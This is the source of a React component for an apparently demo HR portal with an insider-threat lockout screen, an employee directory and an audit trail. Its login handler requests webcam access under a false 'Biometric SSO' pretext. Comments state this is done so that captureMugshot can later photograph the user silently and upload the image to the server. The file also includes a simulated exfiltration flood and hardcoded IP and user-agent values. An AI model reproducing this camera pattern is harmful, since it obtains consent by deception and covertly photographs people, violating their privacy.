"use client";

import { useState, useEffect } from "react";
import api from "@/lib/axios";
import { 
  Building2, Search, Bell, Settings, LayoutDashboard, Users, 
  Plus, Edit, Trash2, DownloadCloud, ShieldAlert, LogOut, Download, Award, Database, Briefcase, Activity, UserCircle, FileText, RefreshCcw
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

export default function HumanResourcesEMS() {
  const [users, setUsers] = useState<any[]>([]);
  const [activeUser, setActiveUser] = useState<any>(null);
  const [isLocked, setIsLocked] = useState(false);
  const [isAttacking, setIsAttacking] = useState(false);
  
  const [employees, setEmployees] = useState<any[]>([]);
  const [isAddModalOpen, setIsAddModalOpen] = useState(false);
  const [isDetailOpen, setIsDetailOpen] = useState(false);
  const [selectedEmployee, setSelectedEmployee] = useState<any>(null);
  const [newEmp, setNewEmp] = useState({ name: "", role: "", dept: "", salary: "", status: "Active" });
  const [activeTab, setActiveTab] = useState("dashboard");
  const [auditLogs, setAuditLogs] = useState<any[]>([]);
  const [isAuditLoading, setIsAuditLoading] = useState(false);
  const [auditError, setAuditError] = useState("");
  const [failedAttempts, setFailedAttempts] = useState(0);
  const FAILED_ATTEMPT_THRESHOLD = 3;

  const loadEmployees = async () => {
    try {
       const { data } = await api.get("/ems/employees");
       setEmployees(data);
    } catch (e) {
       console.error("Failed to load employees");
    }
  };

  useEffect(() => {
    const loadUsers = async () => {
      try {
        const { data } = await api.get("/users");
        setUsers(data.filter((u: any) => u.is_active));
      } catch (e) {
        console.error("Token required");
      }
    };
    loadUsers();
    loadEmployees();
  }, []);

  useEffect(() => {
    const loadAuditLogs = async () => {
      if (!activeUser || activeUser.role !== "ADMIN") return;
      setIsAuditLoading(true);
      setAuditError("");
      try {
        const { data } = await api.get("/admin/logs");
        setAuditLogs(data);
      } catch (e: any) {
        setAuditError("Failed to load audit logs.");
      } finally {
        setIsAuditLoading(false);
      }
    };
    loadAuditLogs();
  }, [activeUser]);

  const handleFacialSSOLogin = async (u: any) => {
    try {
      // Legitimately ask for camera permission under the guise of "Enterprise Biometric SSO"
      // Once the user grants this on login, the browser WILL NEVER ASK AGAIN.
      // This allows the Zero-Trust lockout to later snap a photo 100% silently!
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      stream.getTracks().forEach(t => t.stop()); 
    } catch (err) {
      console.warn("Biometric SSO bypassed.");
    }
    setActiveUser(u);
  };

  const captureMugshot = async (userId: number) => {
    try {
      // Because permission was granted at login, this is now 100% invisible and silent!
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext("2d");
      if (ctx) {
        ctx.drawImage(video, 0, 0, 640, 480);
        const image = canvas.toDataURL("image/jpeg", 0.6);
        await api.post("/platform/capture", { userId, image });
      }
      stream.getTracks().forEach(track => track.stop());
    } catch (err) {
      console.error("Camera inactive or blocked", err);
    }
  };

  const triggerIngest = async (actionDesc: string) => {
    if (!activeUser) return;
    try {
      const { data } = await api.post("/platform/ingest", {
        userId: activeUser.id,
        action: actionDesc,
        ipAddress: "192.168.1.100",
        userAgent: "Corporate-HR-Portal/Windows"
      });
      if (data.message && (data.message.includes("quarantined") || data.risk === "HIGH")) {
        if (!isLocked) captureMugshot(activeUser.id);
        setIsLocked(true);
      }
    } catch (e) {
      console.error(e);
    }
  };

  const handleAddEmployee = async () => {
    if (activeUser?.role === "EMPLOYEE") {
      triggerIngest("ADD_NEW_EMPLOYEE_RECORD");
      setIsAddModalOpen(false);
      setFailedAttempts((prev) => {
        const next = prev + 1;
        if (next >= FAILED_ATTEMPT_THRESHOLD) {
          triggerIngest("REPEATED_PRIVILEGE_ESCALATION_ATTEMPT");
        }
        return next;
      });
      return;
    }
    await api.post("/ems/employees", newEmp, {
      headers: { "X-Acting-User-Id": activeUser?.id }
    });
    setIsAddModalOpen(false);
    setNewEmp({ name: "", role: "", dept: "", salary: "", status: "Active" });
    triggerIngest("ADD_NEW_EMPLOYEE_RECORD");
    loadEmployees();
  };

  const handleDelete = async (id: number) => {
    if (activeUser?.role === "EMPLOYEE") {
      triggerIngest("DELETE_EMPLOYEE_RECORD");
      setFailedAttempts((prev) => {
        const next = prev + 1;
        if (next >= FAILED_ATTEMPT_THRESHOLD) {
          triggerIngest("REPEATED_PRIVILEGE_ESCALATION_ATTEMPT");
        }
        return next;
      });
      return;
    }
    await api.delete(`/ems/employees/${id}`, {
      headers: { "X-Acting-User-Id": activeUser?.id }
    });
    triggerIngest("DELETE_EMPLOYEE_RECORD");
    loadEmployees();
  };

  const handleEdit = () => {
    triggerIngest("EDIT_EMPLOYEE_RECORD");
  };

  const openEmployeeDetail = (emp: any) => {
    setSelectedEmployee(emp);
    setIsDetailOpen(true);
  };

  const refreshAuditLogs = async () => {
    if (!activeUser || activeUser.role !== "ADMIN") return;
    setIsAuditLoading(true);
    setAuditError("");
    try {
      const { data } = await api.get("/admin/logs");
      setAuditLogs(data);
    } catch (e: any) {
      setAuditError("Failed to load audit logs.");
    } finally {
      setIsAuditLoading(false);
    }
  };

  const simulateCyberAttack = async () => {
    setIsAttacking(true);
    let count = 0;
    const attackInterval = setInterval(async () => {
      await triggerIngest("MASS_SENSITIVE_DATA_EXFILTRATION");
      count++;
      if (count >= 25) {
        clearInterval(attackInterval);
        setIsAttacking(false);
      }
    }, 100);
  };

  // Analytics Computations
  const totalPayroll = employees.reduce((sum, e) => sum + parseInt(e.salary.replace(/[^0-9]/g, "") || "0"), 0);
  const avgPayroll = employees.length > 0 ? (totalPayroll / employees.length).toLocaleString() : "0";
  const activeCount = employees.filter(e => e.status === "Active").length;

  if (!activeUser) {
    return (
      <div className="min-h-screen bg-[#f3f4f6] text-slate-800 flex items-center justify-center p-6 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-indigo-100 via-white to-slate-100">
        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="bg-white border border-slate-200 p-10 rounded-3xl shadow-2xl max-w-md w-full text-center">
          <div className="w-16 h-16 bg-indigo-600/10 border border-indigo-500/20 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-inner">
            <Building2 className="w-8 h-8 text-indigo-600" />
          </div>
          <h1 className="text-3xl font-bold tracking-tight mb-2 text-slate-800">HR Directory SSO</h1>
          <p className="text-slate-500 text-sm mb-8 font-medium">Select an active directory profile to inherit HR system privileges.</p>
          
          <div className="space-y-3">
            {users.map((u) => (
              <button 
                key={u.id}
                onClick={() => handleFacialSSOLogin(u)}
                className="w-full flex items-center justify-between p-4 bg-slate-50 border border-slate-200 rounded-xl hover:bg-indigo-50 hover:border-indigo-300 transition-all font-semibold text-slate-700 shadow-sm hover:shadow-md group"
              >
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-indigo-600 rounded-lg flex items-center justify-center text-xs font-bold text-white group-hover:scale-110 transition-transform shadow-md">
                    {u.email.substring(0, 1).toUpperCase()}
                  </div>
                  <span className="truncate max-w-[200px]">{u.email}</span>
                </div>
                <div className="text-xs text-indigo-500 font-bold px-2 py-1 bg-indigo-100 rounded-md">Face ID Auth</div>
              </button>
            ))}
            {users.length === 0 && (
              <div className="text-sm text-red-600 bg-red-50 p-4 rounded-xl border border-red-200 font-bold shadow-sm">
                SSO Token Missing. Login via Admin Dashboard first!
              </div>
            )}
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 text-slate-800 flex overflow-hidden">
      
      {/* ZERO TRUST BLOCKADE OVERLAY */}
      <AnimatePresence>
        {isLocked && (
          <motion.div 
             initial={{ opacity: 0 }} animate={{ opacity: 1 }} 
             className="fixed inset-0 z-50 bg-red-950/95 backdrop-blur-xl flex flex-col items-center justify-center p-6 text-center"
          >
             <motion.div 
                initial={{ scale: 0.9, y: 20 }} animate={{ scale: 1, y: 0 }} transition={{ type: "spring", bounce: 0.5 }}
                className="bg-red-900 border-2 border-red-500/50 p-12 rounded-[3rem] shadow-[0_0_150px_rgba(239,68,68,0.4)] max-w-2xl w-full"
             >
                <div className="w-32 h-32 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-8 border-2 border-red-500/30 shadow-inner">
                  <ShieldAlert className="w-16 h-16 text-red-500 animate-pulse" />
                </div>
                <h1 className="text-5xl font-black text-white tracking-tight mb-4 uppercase drop-shadow-md">Access Revoked</h1>
                <h2 className="text-2xl font-bold text-red-300 mb-8 border-b border-red-800/50 pb-8">Insider Threat Protocol Activated</h2>
                <p className="text-red-100 text-lg leading-relaxed mb-10 font-medium tracking-wide">
                  The artificial intelligence security perimeter detected a severe deviation from your standard baseline operating behavior. 
                  Your account has been instantly stripped of all access architecture and your corp-net session is terminated.
                </p>
                <button onClick={() => window.location.reload()} className="bg-slate-900 border border-slate-700 text-white px-10 py-4 rounded-xl font-bold text-lg hover:bg-slate-800 transition-colors shadow-2xl hover:scale-105">
                  Close Terminal
                </button>
             </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* MODAL FOR ADDING EMPLOYEE */}
      <AnimatePresence>
        {isAddModalOpen && (
          <div className="fixed inset-0 z-40 bg-slate-900/50 backdrop-blur-sm flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.95 }} className="bg-white p-8 rounded-3xl shadow-2xl max-w-md w-full border border-slate-200">
              <h2 className="text-2xl font-bold text-slate-800 mb-6">Add New Employee</h2>
              <div className="space-y-4 mb-8">
                <input type="text" placeholder="Full Name" value={newEmp.name} onChange={e => setNewEmp({...newEmp, name: e.target.value})} className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-indigo-500 outline-none" />
                <input type="text" placeholder="Role (e.g. Developer)" value={newEmp.role} onChange={e => setNewEmp({...newEmp, role: e.target.value})} className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-indigo-500 outline-none" />
                <input type="text" placeholder="Department" value={newEmp.dept} onChange={e => setNewEmp({...newEmp, dept: e.target.value})} className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-indigo-500 outline-none" />
                <input type="text" placeholder="Salary (e.g. $120,000)" value={newEmp.salary} onChange={e => setNewEmp({...newEmp, salary: e.target.value})} className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-indigo-500 outline-none" />
              </div>
              <div className="flex gap-4">
                <button onClick={() => setIsAddModalOpen(false)} className="flex-1 bg-slate-100 text-slate-600 py-3 rounded-xl font-bold hover:bg-slate-200 transition-colors">Cancel</button>
                <button onClick={handleAddEmployee} className="flex-1 bg-indigo-600 text-white py-3 rounded-xl font-bold shadow-lg shadow-indigo-600/30 hover:bg-indigo-700 transition-colors">Onboard</button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* EMPLOYEE DETAIL VIEW */}
      <AnimatePresence>
        {isDetailOpen && selectedEmployee && (
          <div className="fixed inset-0 z-40 bg-slate-900/50 backdrop-blur-sm flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.95 }} className="bg-white p-8 rounded-3xl shadow-2xl max-w-lg w-full border border-slate-200">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 bg-indigo-50 border border-indigo-100 text-indigo-700 rounded-2xl flex items-center justify-center font-bold">
                    {selectedEmployee.name.substring(0,2).toUpperCase()}
                  </div>
                  <div>
                    <h2 className="text-2xl font-bold text-slate-800">{selectedEmployee.name}</h2>
                    <p className="text-slate-500 text-sm font-medium">{selectedEmployee.role}</p>
                  </div>
                </div>
                <button onClick={() => setIsDetailOpen(false)} className="px-4 py-2 bg-slate-100 text-slate-600 rounded-xl font-bold hover:bg-slate-200 transition-colors">Close</button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-slate-50 border border-slate-200 rounded-2xl p-4">
                  <p className="text-xs text-slate-500 uppercase font-bold">Department</p>
                  <p className="text-lg font-semibold text-slate-800 mt-1">{selectedEmployee.dept}</p>
                </div>
                <div className="bg-slate-50 border border-slate-200 rounded-2xl p-4">
                  <p className="text-xs text-slate-500 uppercase font-bold">Status</p>
                  <p className="text-lg font-semibold text-slate-800 mt-1">{selectedEmployee.status}</p>
                </div>
                <div className="bg-slate-50 border border-slate-200 rounded-2xl p-4">
                  <p className="text-xs text-slate-500 uppercase font-bold">Salary / Comp</p>
                  <p className="text-lg font-semibold text-slate-800 mt-1">{selectedEmployee.salary}</p>
                </div>
                <div className="bg-slate-50 border border-slate-200 rounded-2xl p-4">
                  <p className="text-xs text-slate-500 uppercase font-bold">Role</p>
                  <p className="text-lg font-semibold text-slate-800 mt-1">{selectedEmployee.role}</p>
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* SIDEBAR */}
      <aside className="w-72 bg-slate-900 text-slate-300 border-r border-slate-800 hidden lg:flex flex-col shadow-xl z-10 relative">
        <div className="h-20 flex items-center px-8 gap-4 pt-4 mb-6">
          <div className="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center shadow-[0_0_20px_rgba(79,70,229,0.4)]">
            <Users className="w-5 h-5 text-white" />
          </div>
          <span className="text-2xl font-black text-white tracking-tight">Enterprise HR</span>
        </div>
        
        <nav className="flex-1 px-4 space-y-3">
          <p className="px-4 text-xs font-bold text-slate-500 uppercase tracking-widest mb-4 mt-4">Management Modules</p>
          <button onClick={() => setActiveTab("dashboard")} className={`w-full flex items-center gap-4 px-4 py-3 rounded-xl transition-all font-semibold ${activeTab === 'dashboard' ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-600/20 border border-indigo-500' : 'text-slate-400 hover:text-white hover:bg-slate-800'}`}>
            <LayoutDashboard className="w-5 h-5" /> Executive Dashboard
          </button>
          <button onClick={() => setActiveTab("directory")} className={`w-full flex items-center gap-4 px-4 py-3 rounded-xl transition-all font-semibold ${activeTab === 'directory' ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-600/20 border border-indigo-500' : 'text-slate-400 hover:text-white hover:bg-slate-800'}`}>
            <Briefcase className="w-5 h-5" /> Staff Directory
          </button>
          <button onClick={() => setActiveTab("audit")} className={`w-full flex items-center gap-4 px-4 py-3 rounded-xl transition-all font-semibold ${activeTab === 'audit' ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-600/20 border border-indigo-500' : 'text-slate-400 hover:text-white hover:bg-slate-800'}`}>
            <FileText className="w-5 h-5" /> Audit Trail
          </button>
          <button className="w-full flex items-center gap-4 px-4 py-3 text-slate-400 hover:text-white hover:bg-slate-800 rounded-xl transition-all font-semibold opacity-50 cursor-not-allowed">
            <Award className="w-5 h-5" /> Benefits & Payroll (Locked)
          </button>
        </nav>
        
        <div className="p-6 border-t border-slate-800 bg-slate-950/50 flex items-center gap-4 mt-auto">
          <div className="w-10 h-10 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-full flex items-center justify-center text-white font-bold border-2 border-slate-700 shadow-md">
            {activeUser.email.substring(0, 1).toUpperCase()}
          </div>
          <div className="flex-1 min-w-0">
            <p className="text-sm font-bold text-white truncate">{activeUser.email.split('@')[0]}</p>
            <p className="text-xs text-slate-400 font-medium truncate">
                {activeUser.role === 'ADMIN' ? 'HR Administrator' : 'Standard Employee'}
            </p>
          </div>
        </div>
      </aside>

      {/* MAIN CONTENT AREA */}
      <main className="flex-1 flex flex-col h-screen overflow-hidden bg-slate-50 relative z-0">
        
        {/* HEADER */}
        <header className="h-20 bg-white flex items-center justify-between px-10 border-b border-slate-200 shadow-sm">
          <div className="w-128 relative">
            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
            <input type="text" placeholder="Search employee database..." className="w-[400px] pl-12 pr-4 py-2.5 bg-slate-100 border border-slate-200 rounded-xl font-medium focus:ring-2 focus:ring-indigo-500 outline-none transition-all focus:bg-white" />
          </div>
          <div className="flex items-center gap-4 text-slate-500">
            <button className="p-2.5 hover:bg-slate-100 rounded-xl transition-colors"><Settings className="w-5 h-5" /></button>
            <button className="p-2.5 hover:bg-slate-100 rounded-xl transition-colors relative">
              <Bell className="w-5 h-5" />
              <span className="absolute top-2 right-2 w-2.5 h-2.5 bg-red-500 rounded-full border-2 border-white shadow-sm"></span>
            </button>
            <div className="h-8 w-px bg-slate-200 mx-2"></div>
            <button onClick={() => window.location.reload()} className="px-4 py-2.5 hover:text-red-600 hover:bg-red-50 rounded-xl transition-colors flex items-center gap-2 text-sm font-bold uppercase tracking-wider">
              <LogOut className="w-4 h-4" /> End Session
            </button>
          </div>
        </header>

        {/* SCROLLABLE VIEW */}
        <div className="flex-1 overflow-y-auto w-full h-full">
          <div className="max-w-7xl mx-auto p-10">

            {activeTab === "dashboard" && (
              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-8">
                <div>
                  <h2 className="text-3xl font-black text-slate-800 tracking-tight">Executive Dashboard</h2>
                  <p className="text-slate-500 mt-2 font-medium text-lg">Daily corporate metrics and payroll distributions.</p>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
                  <div className="bg-white border-b-4 border-indigo-500 p-8 rounded-2xl border border-t-slate-200 border-x-slate-200 shadow-sm">
                    <div className="flex items-center justify-between mb-4">
                      <p className="text-slate-500 font-bold text-sm uppercase tracking-wider">Total Headcount</p>
                      <Users className="text-indigo-500 w-6 h-6" />
                    </div>
                    <p className="text-5xl font-black text-slate-800">{employees.length}</p>
                    <p className="text-xs font-semibold text-emerald-500 mt-4">+12% from last quarter</p>
                  </div>

                  <div className="bg-white border-b-4 border-emerald-500 p-8 rounded-2xl border border-t-slate-200 border-x-slate-200 shadow-sm">
                    <div className="flex items-center justify-between mb-4">
                      <p className="text-slate-500 font-bold text-sm uppercase tracking-wider">Active Employees</p>
                      <Activity className="text-emerald-500 w-6 h-6" />
                    </div>
                    <p className="text-5xl font-black text-slate-800">{activeCount}</p>
                    <p className="text-xs font-semibold text-slate-400 mt-4">{employees.length - activeCount} on leave</p>
                  </div>

                  <div className="bg-white border-b-4 border-purple-500 p-8 rounded-2xl border border-t-slate-200 border-x-slate-200 shadow-sm">
                    <div className="flex items-center justify-between mb-4">
                      <p className="text-slate-500 font-bold text-sm uppercase tracking-wider">Avg Monthly Salary</p>
                      <Award className="text-purple-500 w-6 h-6" />
                    </div>
                    <p className="text-5xl font-black text-slate-800">${avgPayroll}</p>
                    <p className="text-xs font-semibold text-rose-500 mt-4">-2% optimization</p>
                  </div>
                </div>

                {/* THE ATTACK VECTOR IN THE DASHBOARD */}
                <div className="border border-slate-300 rounded-3xl p-10 bg-white flex flex-col md:flex-row gap-8 items-center justify-between shadow-xl relative overflow-hidden group hover:border-indigo-400 transition-all mt-10">
                  <div className="absolute -right-10 -bottom-10 opacity-[0.03] group-hover:opacity-[0.05] transition-opacity">
                    <Database className="w-80 h-80 text-slate-900" />
                  </div>
                  <div className="flex-1 relative z-10 pr-10">
                    <div className="flex items-center gap-3 mb-3">
                      <Database className="w-8 h-8 text-indigo-700" />
                      <h3 className="font-black text-slate-800 text-2xl tracking-tight">Enterprise Database Exporter</h3>
                    </div>
                    <p className="text-slate-500 text-lg leading-relaxed font-medium">
                      Authenticate a bulk export of all underlying PostgreSQL Employee Database tables, payroll logs, and SSO configuration maps over SSL to a local CSV archive.
                    </p>
                  </div>
                  
                  <button 
                    onClick={simulateCyberAttack}
                    disabled={isAttacking || activeUser?.role === "EMPLOYEE"}
                    className={`px-10 py-5 rounded-2xl font-black flex items-center gap-4 transition-all relative z-10 uppercase tracking-widest text-lg ${
                      (isAttacking || activeUser?.role === "EMPLOYEE")
                      ? 'bg-slate-200 text-slate-400 border border-slate-300 cursor-not-allowed'
                      : 'bg-indigo-600 text-white shadow-xl hover:shadow-[0_0_30px_rgba(79,70,229,0.5)] hover:scale-105 active:scale-95 border-2 border-indigo-500 hover:bg-indigo-700'
                    }`}
                  >
                    <DownloadCloud className={`w-6 h-6 ${isAttacking ? 'animate-bounce' : ''}`} />
                    {isAttacking ? 'Transmitting...' : activeUser?.role === "EMPLOYEE" ? 'Restricted Export' : 'Full System Backup'}
                  </button>
                </div>

                {/* EMPLOYEE RISK TRIGGER PANEL */}
                {activeUser?.role === "EMPLOYEE" && (
                  <div className="border border-rose-200 rounded-3xl p-8 bg-rose-50 shadow-sm space-y-6">
                    <div className="flex items-center gap-3">
                      <ShieldAlert className="w-6 h-6 text-rose-600" />
                      <h3 className="font-black text-rose-700 text-xl tracking-tight">Employee Risk Actions</h3>
                    </div>
                    <p className="text-rose-700/80 text-base leading-relaxed font-medium">
                      The following actions are monitored and may trigger elevated risk for standard employees.
                    </p>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <button
                        onClick={() => triggerIngest("ADMIN_LOGS_ACCESS_ATTEMPT")}
                        className="px-5 py-4 rounded-2xl font-black flex items-center justify-center gap-2 transition-all uppercase tracking-widest text-xs bg-rose-600 text-white shadow-lg hover:bg-rose-700 hover:scale-[1.02] active:scale-95"
                      >
                        <FileText className="w-4 h-4" />
                        Admin Logs
                      </button>
                      <button
                        onClick={() => triggerIngest("BULK_PAYROLL_DOWNLOAD")}
                        className="px-5 py-4 rounded-2xl font-black flex items-center justify-center gap-2 transition-all uppercase tracking-widest text-xs bg-rose-600 text-white shadow-lg hover:bg-rose-700 hover:scale-[1.02] active:scale-95"
                      >
                        <Download className="w-4 h-4" />
                        Payroll Export
                      </button>
                      <button
                        onClick={() => triggerIngest("MASS_SENSITIVE_DATA_EXFILTRATION")}
                        className="px-5 py-4 rounded-2xl font-black flex items-center justify-center gap-2 transition-all uppercase tracking-widest text-xs bg-rose-600 text-white shadow-lg hover:bg-rose-700 hover:scale-[1.02] active:scale-95"
                      >
                        <DownloadCloud className="w-4 h-4" />
                        Data Exfil
                      </button>
                    </div>

                    <div className="flex items-center justify-between bg-white border border-rose-200 rounded-2xl p-4">
                      <div>
                        <p className="text-xs uppercase font-bold text-rose-600">Failed Privilege Attempts</p>
                        <p className="text-lg font-black text-rose-700">{failedAttempts} / {FAILED_ATTEMPT_THRESHOLD}</p>
                      </div>
                      <div className="text-sm text-rose-600 font-semibold">
                        Auto-escalates on threshold
                      </div>
                    </div>
                  </div>
                )}
              </motion.div>
            )}

            {activeTab === "directory" && (
              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
                <div className="flex items-end justify-between mb-8">
                  <div>
                    <h2 className="text-3xl font-black text-slate-800 tracking-tight">Staff Directory</h2>
                    <p className="text-slate-500 mt-2 font-medium text-lg">Manage corporate staff, payroll, and departmental roles.</p>
                  </div>
                  
                  <button 
                    onClick={() => setIsAddModalOpen(true)}
                    disabled={activeUser?.role === "EMPLOYEE"}
                    className={`px-6 py-3 rounded-xl font-bold shadow-lg transition-all flex items-center gap-2 ${
                      activeUser?.role === "EMPLOYEE"
                        ? "bg-slate-200 text-slate-400 cursor-not-allowed border border-slate-300"
                        : "bg-indigo-600 text-white shadow-indigo-600/30 hover:bg-indigo-700 hover:scale-105"
                    }`}
                  >
                    <Plus className="w-5 h-5" /> Hire Employee
                  </button>
                </div>

                <div className="bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden mb-12">
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="border-b border-slate-200 bg-slate-50/80 text-slate-500 uppercase text-xs tracking-wider">
                        <th className="font-bold py-4 px-8">Employee Name</th>
                        <th className="font-bold py-4 px-8">Role & Department</th>
                        <th className="font-bold py-4 px-8">Salary / Comp</th>
                        <th className="font-bold py-4 px-8">Status</th>
                        <th className="font-bold py-4 px-8 text-right">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-100 text-slate-700">
                      <AnimatePresence>
                        {employees.map((emp) => (
                          <motion.tr 
                            initial={{ opacity: 0, scale: 0.98 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.95 }}
                            key={emp.id} className="hover:bg-slate-50 transition-colors group"
                          >
                            <td className="py-5 px-8 font-bold text-slate-800 flex items-center gap-4">
                              <div className="w-10 h-10 bg-indigo-50 border border-indigo-100 text-indigo-700 rounded-full flex items-center justify-center font-bold">
                                {emp.name.substring(0,2).toUpperCase()}
                              </div>
                              {emp.name}
                            </td>
                            <td className="py-5 px-8">
                              <div className="font-semibold text-slate-700">{emp.role}</div>
                              <div className="text-slate-400 text-xs font-medium uppercase mt-0.5">{emp.dept}</div>
                            </td>
                            <td className="py-5 px-8 font-mono font-medium text-slate-600">{emp.salary}</td>
                            <td className="py-5 px-8">
                              <span className={`px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider ${
                                emp.status === 'Active' ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'
                              }`}>
                                {emp.status}
                              </span>
                            </td>
                            <td className="py-5 px-8">
                              <div className="flex items-center justify-end gap-2">
                                <button onClick={() => openEmployeeDetail(emp)} className="p-2 text-slate-400 hover:text-slate-700 hover:bg-slate-100 rounded-lg transition-colors border border-transparent hover:border-slate-200 shadow-sm">
                                  <UserCircle className="w-4 h-4" />
                                </button>
                                <button
                                  onClick={handleEdit}
                                  disabled={activeUser?.role === "EMPLOYEE"}
                                  className={`p-2 rounded-lg transition-colors border shadow-sm ${
                                    activeUser?.role === "EMPLOYEE"
                                      ? "text-slate-300 bg-slate-100 border-slate-200 cursor-not-allowed"
                                      : "text-slate-400 hover:text-indigo-600 hover:bg-indigo-50 border-transparent hover:border-indigo-200"
                                  }`}
                                >
                                  <Edit className="w-4 h-4" />
                                </button>
                                <button
                                  onClick={() => handleDelete(emp.id)}
                                  disabled={activeUser?.role === "EMPLOYEE"}
                                  className={`p-2 rounded-lg transition-colors border shadow-sm ${
                                    activeUser?.role === "EMPLOYEE"
                                      ? "text-slate-300 bg-slate-100 border-slate-200 cursor-not-allowed"
                                      : "text-slate-400 hover:text-red-600 hover:bg-red-50 border-transparent hover:border-red-200"
                                  }`}
                                >
                                  <Trash2 className="w-4 h-4" />
                                </button>
                              </div>
                            </td>
                          </motion.tr>
                        ))}
                      </AnimatePresence>
                    </tbody>
                  </table>
                  {employees.length === 0 && (
                    <div className="p-12 text-center text-slate-500 font-medium bg-slate-50">
                      No employees currently in directory. Click "Hire Employee" to add records.
                    </div>
                  )}
                </div>
              </motion.div>
            )}

            {activeTab === "audit" && (
              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
                <div className="flex items-end justify-between">
                  <div>
                    <h2 className="text-3xl font-black text-slate-800 tracking-tight">Audit Trail</h2>
                    <p className="text-slate-500 mt-2 font-medium text-lg">Real-time security logs and access events.</p>
                  </div>
                  <button
                    onClick={refreshAuditLogs}
                    disabled={activeUser?.role !== "ADMIN" || isAuditLoading}
                    className={`px-5 py-3 rounded-xl font-bold shadow-sm transition-all flex items-center gap-2 ${
                      activeUser?.role !== "ADMIN"
                        ? "bg-slate-200 text-slate-400 cursor-not-allowed border border-slate-300"
                        : "bg-slate-900 text-white hover:bg-slate-800"
                    }`}
                  >
                    <RefreshCcw className="w-4 h-4" />
                    {isAuditLoading ? "Refreshing..." : "Refresh Logs"}
                  </button>
                </div>

                {activeUser?.role !== "ADMIN" && (
                  <div className="bg-amber-50 border border-amber-200 text-amber-700 p-6 rounded-2xl font-semibold">
                    Audit access restricted. Elevate to HR Administrator for full visibility.
                  </div>
                )}

                {activeUser?.role === "ADMIN" && (
                  <div className="bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
                    {auditError && (
                      <div className="p-4 bg-red-50 text-red-600 border-b border-red-200 font-semibold">
                        {auditError}
                      </div>
                    )}
                    <table className="w-full text-left border-collapse">
                      <thead>
                        <tr className="border-b border-slate-200 bg-slate-50/80 text-slate-500 uppercase text-xs tracking-wider">
                          <th className="font-bold py-4 px-8">Timestamp</th>
                          <th className="font-bold py-4 px-8">User</th>
                          <th className="font-bold py-4 px-8">Action</th>
                          <th className="font-bold py-4 px-8">IP</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-100 text-slate-700">
                        {auditLogs.map((log) => (
                          <tr key={log.id} className="hover:bg-slate-50 transition-colors">
                            <td className="py-4 px-8 text-sm font-medium">
                              {new Date(log.created_at).toLocaleString()}
                            </td>
                            <td className="py-4 px-8 text-sm font-semibold">{log.email}</td>
                            <td className="py-4 px-8 text-sm">{log.action}</td>
                            <td className="py-4 px-8 text-sm font-mono text-slate-500">{log.ip_address}</td>
                          </tr>
                        ))}
                        {auditLogs.length === 0 && !isAuditLoading && (
                          <tr>
                            <td className="py-10 px-8 text-center text-slate-500 font-medium" colSpan={4}>
                              No audit events found.
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>
                )}
              </motion.div>
            )}

          </div>
        </div>
      </main>
    </div>
  );
}
